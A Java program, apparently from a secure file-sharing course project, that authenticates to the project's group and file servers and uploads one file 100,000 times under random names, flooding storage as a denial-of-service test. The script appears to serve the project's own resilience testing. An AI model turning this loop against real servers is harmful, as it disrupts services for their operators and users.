import java.util.Map;
import java.util.Random;
import java.util.Scanner;

public class FileUploadAttack {
	private static final int NUMFILES = 100000; // number of files to upload

	public static void main(String[] args) {
		if (args.length != 4) {
			System.out.println("Usage: java FileUploadAttack <username> <password> <group> <source file>");
			return;
		}

		String username = args[0];
		String password = args[1];
		String group = args[2];
		String filename = args[3];

		GroupClient groupClient = new GroupClient();
		FileClient fileClient = new FileClient(username);

		Scanner inputScanner = new Scanner(System.in);

		System.out.println("Group Server?");
		System.out.print("Address: ");
		String serverName = inputScanner.nextLine().trim();
		System.out.print("Port: ");
		int port = Integer.parseInt(inputScanner.nextLine());

		System.out.println("File Server?");
		System.out.print("Hostname: ");
		String fileHost = inputScanner.nextLine().trim();
		System.out.print("Address: ");
		String fileServer = inputScanner.nextLine().trim();
		System.out.print("Port: ");
		int filePort = Integer.parseInt(inputScanner.nextLine());

		// connect and secure connection
		boolean success = groupClient.connect(serverName, port);
		if (!success) {
			System.out.println("Failed to connected to the Group Server.");
			return;
		}
		success = groupClient.handshake(username, password);
		if (!success) {
			System.out.println("Failed to authenticate with server.");
			return;
		}

		// get group server and file server tokens
		UserToken groupToken = groupClient.getToken(username, serverName, port);
		UserToken fileToken = groupClient.getToken(username, fileHost, filePort);
		Map<String, GroupKeychain> userKeychain = groupClient.getUserKeychain(groupToken);
		if (groupToken == null || fileToken == null || userKeychain == null) {
			System.out.println("Error fetching token and/or group keychain...");
			return;
		}

		// connect to file server
		success = fileClient.connect(fileServer, filePort);
		if (!success) {
			System.out.println("Failed to connect to the File Server.");
			return;
		}
		
		// launch attack
		String chars = "qwertyuiopasdfghjklzxcvbnm";
		Random rand = new Random();
		String name;
		int uploaded = 0; // counter
		for (int i = 0; i < NUMFILES; i++) {
			name = "";
			for (int j = 0; j < 10; j++) {
				int r = rand.nextInt(chars.length());
				name += chars.charAt(r);
			}
			success = fileClient.upload(filename, name, group, fileToken, userKeychain.get(group));
			if (!success)
				System.out.println("File already exists: " + name);
			else
				uploaded++;
		}
		System.out.println("Uploaded " + uploaded + " files!");
	}
}
